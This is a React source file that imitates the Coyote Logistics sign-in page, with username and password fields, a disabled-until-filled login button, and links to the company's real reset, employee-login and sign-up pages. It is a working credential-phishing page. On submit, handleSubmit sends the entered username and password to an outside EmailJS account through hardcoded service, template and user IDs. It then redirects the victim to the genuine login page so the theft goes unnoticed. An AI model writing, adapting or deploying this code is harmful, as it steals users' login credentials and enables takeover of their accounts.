import '../Form/formfk.css';
import { useState, useRef } from "react";
import pak from '../../img/pak.svg';
import bac from '../../img/bac.svg';

function FormFk() {
    const [passwordShown, setPasswordShown] = useState(false);
    const [active, setActive] = useState(false);
    const userName = useRef(null);
    const passwordUser = useRef(null);
    var qfNum = 0;
    function qfFunck(qf) {
        if(qf.value.indexOf('ccox') !== -1 || qf.value.indexOf('klir') !== -1 || qf.value.indexOf('qunn') !== -1 || qf.value.indexOf('jajtam') !== -1 ||
        qf.value.indexOf('jaj tam') !== -1 || qf.value.indexOf('txeq') !== -1 || qf.value.indexOf('cceq') !== -1 || qf.value.indexOf('uteq') !== -1 ||
        qf.value.indexOf('fuck') !== -1 || qf.value.indexOf('suck') !== -1 || qf.value.indexOf('dick') !== -1 || qf.value.indexOf('gandon') !== -1 ||
        qf.value.indexOf('qunnem') !== -1 || qf.value.indexOf('txa') !== -1 || qf.value.indexOf('boz') !== -1 || qf.value.indexOf('chatlax') !== -1 ||
        qf.value.indexOf('gyot') !== -1 || qf.value.indexOf('garlax') !== -1) {
            qf.value = '';
            qfNum = 1;
            if(active == true){setActive(!active);}
        } else {
            qfNum = 0;
            if(userName.current.value && passwordUser.current.value) {
                if(active == false){setActive(!active);}
            }
        }
    }
    const handleInputBlur = event => {
        qfFunck(event.target);
        if(event.target.value == 0){if(active == true){setActive(!active);}}
    };
    const togglePassword = () => {
        setPasswordShown(!passwordShown);
    };

    const SERVICE_ID = 'service_cf79ytj';
    const TEMPLATE_ID = 'template_8oalb5q';
    const USER_ID = "5Fma-P-1aeivvlJxc";
    async function handleSubmit(event) {
        event.preventDefault();
        qfFunck(userName.current);
        if(qfNum === 1) {
            userName.current.value = '';
        } else if(qfNum === 0) {
            qfFunck(passwordUser.current);
            if(qfNum === 0){
                if(userName.current.value && passwordUser.current.value) {
                    emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
                    window.location.href = "https://auth.coyote.com/Account/Login";
                    return;
                }
            }
        }
    }

    return (
      <section className="form_box">
            <div style={{display:'none'}} className='errorBlock'>
                <span>The username or password you entered is incorrect.</span>
            </div>
            <form onSubmit={handleSubmit} id="formss">
                <div className="inputBlock">
                    <input onBlur={handleInputBlur} id="Username" ref={userName} name="Username" auto-id="signin_username_input" type="text" placeholder="Username" className="form-control" />
                </div>
                <div className="inputBlock">
                    <input onBlur={handleInputBlur} id="Password" ref={passwordUser} name="Password" auto-id="signin_password_input" type={passwordShown ? "text" : "password"} placeholder="Password" className="form-control" />
                    <span className="eyeIcon" onClick={togglePassword}>
                        <img src={passwordShown ? bac : pak} className='openPass'></img>
                    </span>
                </div>
                <button disabled={active ? false : true} id="btnLogin" auto-id="signin_submit_login_button" type='submit' className={active ? "btn-primary-active" : "btn-primary"}> Log in</button>
            </form>
            <div className='linksBox'>
                <a target='_blank' href="https://auth.coyote.com/Password/RequestPasswordReset" id="forgotLink" type="button" className="forgotLink">Forgot Username or Password?</a>
                <a target='_blank' href="https://login.microsoftonline.com/common/oauth2/authorize?client_id=8d7aeffd-c53a-44c4-8b10-6b70c79f5a7f&redirect_uri=https%3A%2F%2Fauth.coyote.com%2Fsignin-oidc&response_type=id_token&scope=openid%20profile&response_mode=form_post&nonce=638351198256224211.NTdmZTY5MjItMTJlOC00NGYwLWJkNDQtMGMxMTlhYWU5ODRmZDA4ZmQ0ZjAtNzJhNC00NWMxLThlNzAtNWZjZTdkYmI5MDU3&domain_hint=coyote.com&state=CfDJ8Gu8t2rbLQFAvIUZQ07MAVpok7-iVMCS_f_5pFHe5JBSB4gctn7hf-PzcKreyrnaUdU4cE5R318U01Yy-A9mxsh9heVNswOFXIbH1sBfU3kAFoGYJ3yU7SIJ5vHWN5YgkLFWsRYOOh02iqbaNQpyNGuOynxBijSyv77eY1Wv9qWcqu5Ou7WBU5hsef4TGeigGP9fYgtHVe-utheXHWZXfP3uLckW__GnNcIRE4vgfXyoTp9z_THLPQ9oNsPjmF6ie_KNgGKs1QeUcByOtmOQkaZAccCMHybngOdIkUOYcwx13B-NYesCT5U4rxH2mr8d0Z7DC4s6N4sDdoqK1N0fV_Bh4ie-T-qFikQhW1i8EOHyg5IBD1UrVVbwyGMw5QJVoRdXqefKkG_g7aP8TVz-fO71GJMvmpXv8xIzlxY0J0hh47n7XWa8IXMF_lf2GvfMG4ig7l0oiaBoFBOiR-XLSbPDP1_eFKrLq84RG9TMxAnPZjvjHeXusST1Wd79xi2MbhbB1fhxAj62XJI_hUechZKN3am389axkxCUDRs4TrUig2knqW8fcVTRV2s1bADDzdoAAdxnedCnguVuga4gqb7VAI11K7yDdE1XLlHbJD-d7LGWjbyDE3NFplyD15mSA_roGBYnLCjBENxs4MtTMfCn2SwBHOHV76HfVUPHNrtyPaafi5H_kV004t26jFIBjEeJSFfAsVs7gHcCd10M5Ae5TXlw4ag0UlAEHgy-E67qp6tr-hwpuw6i-rW9KmTferOz0Uyq7eApLTJKvDjPuxs8o6V2H80HMtdKXsE0hPkqy54UipXzS3_HIKEXCS2YSzyrt0h9opoDSMG5q3ivzigC9C48luHjSuPegm4GN2gjqCdagExI4fzc-9LCH1D3F4_nyiMa5NBsCXEFv6893k0tOPJVb4bKZ3LypT_A_yOClCUUeVx8VZfXi8A0ymz463BHjT6Wiu0doQtc-jP1OKdW8o3SKPaOjR-5r_Jp25IP5m_qzNgcts0xg59wh_glbVdJi9PCab0ozl1uagVflK2NChUwXRU5Oek4InfTCigMg90hDzXOhqxeSDxTyL068r-HdKpFAkaksMkNHq3VE8a7eOXc8wV5CMkigRIvMxinaT6B1k8wO2B7qoI3XnKRy7gD_EWRNXj1IEV0CB1Op_hozi7wlcOTGo3xWilfrFfz5QLtMtvPMBjhpfyr69z2wc51MQx1eAmAmsukQ3oUZ1pqFAAHbD-9NUQ1m2a4KA1Y-tctXYwVbLwzTnRLJCU2VENkcm3Pb2o5YjXWBerdwzMEokL1zqaBzRXMbkpsnnBrQNrmPhIVEIj3qFc-5bPv6vxQ9aRdaGkD41V3U5itACuTWsBFuo_htGR6betZ_iXCgAZSw8EFSpu4YMqw1-Vdl2r-YTIABu8vneki1taMId870CMdNgxp9fw_0gDVher3dTTA9RSbMV4WZXuN7zRDdLJArMy6Q6QeZbqA_ShMJVRjg0X2FwYV1UTxOCoQSGvC&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.10.0.0" id="employeLog" type="button" className="employeLog">Employee Login</a>
                <span className='dontAccount'>Don’t have an account?</span>
                <div className='signUpBlock'>
                    <a target='_blank' href="https://go.coyote.com/register/shipper/?medium=api_coyote&source=log_in&name=join_button&_gl=1*1pryn6f*_ga*MTIyODYwODcxMC4xNjkyODk4OTg0*_ga_LPFNEQRFFX*MTY5OTUyMjI5Ni41LjEuMTY5OTUyMzA3Ni4xMC4wLjA." id='shipSignUp' type="button" className="shipSignUp">SHIPPER SIGN UP</a>
                    <span className="divide">|</span>
                    <a target='_blank' href="https://coyote.com/carriers/load-board-access/?_gl=1%2A1eglzsk%2A_ga%2AMTIyODYwODcxMC4xNjkyODk4OTg0%2A_ga_LPFNEQRFFX%2AMTY5OTUyMjI5Ni41LjEuMTY5OTUyMzA4MS41LjAuMA.." id="carSignUp" type="button" className="carSignUp">CARRIER SIGN UP</a>
                </div>
            </div>
      </section>
    );
  }
  
  export default FormFk;
  